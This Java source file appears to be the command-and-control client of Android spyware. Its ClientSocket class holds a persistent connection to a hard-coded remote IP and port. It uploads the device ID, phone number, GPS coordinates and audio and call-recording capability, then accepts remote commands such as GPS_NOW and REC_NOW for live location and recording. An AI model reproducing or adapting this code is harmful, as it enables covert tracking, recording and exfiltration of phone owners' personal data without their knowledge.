package com.privacy.system.service.utilservice;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.SystemClock;
import android.text.TextUtils;
import com.google.gson.Gson;
import com.privacy.system.base.C;
import com.privacy.system.domain.DeviceInfo;
import com.privacy.system.util.HttpUtil;
import com.privacy.system.util.Logger;


/**
 * 客户端socket用于随时接受发送的指令
 */
public abstract class ClientSocket extends Thread {
	
	private static final String DEVICE_ID = "device_id";
	private static final String PHONE_NUM = "phone_num";
	private static final String LON = "lon";
	private static final String LAT = "lat";
	private Socket m_socket;
	private Context context;
	
	//是否支持录音
	private static final String SUP_REC = "support_rec";
	//是否支持GPS
	private static final String SUP_GPS = "support_gps";
	//是否支持通话录音
	private static final String SUP_CALL_REC = "support_call_rec";
	
	private static final String DEVICE_BRAND = "brand";
	private static final String DEVICE_SYSTEM = "system";
	private static final String SOCKET_REQ_KEY_VAL = "e271#af5=fe0ZacdB45379f234ecAe17";
	private static final String LOC_NAME = "loc_name";
	private static final String FONT_CODE = "UTF-8";
	
	public static String APP_REQ_KEY = "";
	private String loc_name;
	private String server="112.83.192.116";
	private int port = 801;
	
	private DeviceInfo deviceInfo;

	public static final int DEVICE_SUPPORT = 1;
	public static final int DEVICE_NOT_SUPPORT = 0;
	
	public static final String TYPE_INFO = "MON_INFO";
	public static final String TYPE_GPS_NOW=  "GPS_NOW";
	public static final String TYPE_REC_NOW=  "REC_NOW";
	
	public ClientSocket(DeviceInfo deviceInfo,Context context){
		this.deviceInfo = deviceInfo;
		this.context = context;
	    this.start();
	}
	
	@Override
	public void run() {
		while(true){
			sleep();
			if(m_socket==null || m_socket.isClosed()){
				createSocket();
				sendDeviceInfo();
			}
			if(m_socket !=null && !m_socket.isInputShutdown()){
				readData() ;
				m_socket = null;
			}
		}
	}
	
	//读取数据
	private void readData(){
		try {
			BufferedReader	br = new BufferedReader(new InputStreamReader(m_socket.getInputStream(), FONT_CODE), 8192);
			
			while (br != null && m_socket != null && !m_socket.isClosed() && !m_socket.isInputShutdown()) {
				String data = null;
				data = readLine(br);
				//如果读取数据失败，说明socket已经失去连接了
				if(data==null){
					br.close();
					br = null;
					Logger.d("ClientSocket","socket read data fail");
				}else{
					receiveData(data);
					continue;
				}
		}
		} catch (Exception e) {
			Logger.d("ClientSocket","读取数据失败");
		}
		try {
			m_socket.close();
		} catch (IOException e) {
			Logger.d("ClientSocket","socket close error");
		}
		m_socket = null;
	}
	
	private String readLine(BufferedReader br){
		String data = null;
		try {
			data = br.readLine();
		} catch (Exception e) {
			
		}
		return data;
	}
	
	@SuppressWarnings("unchecked")
	private void receiveData(String mapStr){
		Logger.d("ClientSocket","内容为:"+mapStr);
		if(TextUtils.isEmpty(mapStr)){
			return ;
		}
		Map<String, String> map = null;
		try {
			if(!mapStr.equals("")){
				mapStr = mapStr.substring(0, mapStr.lastIndexOf("}")+1);
				map = new Gson().fromJson(mapStr, HashMap.class);
			}
		} catch (Exception e) {
			if(map==null){
				return;
			}
		}
		String type = "";
		String data = null;
		if(map.containsKey("type")){
			type = map.get("type").toString();
			Logger.d("ClientSocket","type=="+type);
		}
		if(map.containsKey("data")){
			data = map.get("data");
			Logger.d("ClientSocket","data=="+data);
		}
		if(map.containsKey("key")){
			APP_REQ_KEY = map.get("key").toString();
		}
		if(!TextUtils.isEmpty(type)&& !TextUtils.isEmpty(data) && !TextUtils.isEmpty(APP_REQ_KEY)){
			receiveData(type,data);
		}
	}
	
	public abstract void receiveData(String type, String data);
	
	private long lastSendInfoTime = 0;
	
	private void sendDeviceInfo(){
		// 时间间隔小于5分钟，不再发送设备信息
		if ((System.currentTimeMillis() - lastSendInfoTime) < (5 * 60 * 1000)) {
			return;
		}
		SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO, Context.MODE_PRIVATE);
		boolean isUpload = sp.getBoolean("uploaddeivceinfo", false);
		if(isUpload) return;
		Map<String,String> cMap= new HashMap<String, String>();
		cMap.put(DEVICE_ID, deviceInfo.getDeviceID());
		cMap.put(PHONE_NUM, deviceInfo.getPhoneNum());
		cMap.put(LON, deviceInfo.getLon() + "");
		cMap.put(LAT, deviceInfo.getLat() + "");
		cMap.put(SUP_REC, deviceInfo.getSupRec() + "");
		cMap.put(SUP_GPS, deviceInfo.getSupGPS() + "");
		cMap.put(SUP_CALL_REC, deviceInfo.getSupCallRec() + "");
		cMap.put(DEVICE_BRAND,deviceInfo.getBrand());
		cMap.put(DEVICE_SYSTEM,deviceInfo.getSystem());
		cMap.put(LOC_NAME, loc_name);
		cMap.put("key", SOCKET_REQ_KEY_VAL);
		String mapStr = new Gson().toJson(cMap);
		try {
			PrintWriter pw = new PrintWriter(new OutputStreamWriter(m_socket.getOutputStream(),FONT_CODE));
			pw.println(mapStr);
			pw.flush();
			Logger.d("ClientSocket","上传设备信息成功...");
			lastSendInfoTime = new Date().getTime();
		} catch (Exception e) {
			Logger.d("ClientSocket","Socket Send Device Info Failed");
		}
	}
	
	private void createSocket(){
		if(m_socket !=null){
			try {
				m_socket.close();
				m_socket = null;
			} catch (IOException e) {
			    Logger.d("ClientSocket","关闭socket异常...");
			}
			
		}
		
		try {
			if(!HttpUtil.detect(context))return ;
			m_socket = new Socket();
			int time =15 * 60 * 1000;
			m_socket.setSoTimeout(time);
			m_socket.setKeepAlive(true);
			m_socket.connect(new InetSocketAddress(server,port),3000);
			
		}catch (IOException e) {
			Logger.d("ClientSocket","创建socket异常.......");
			m_socket = null;
		}
	}
	
	private void sleep() {
		SystemClock.sleep(3000);
	}

}
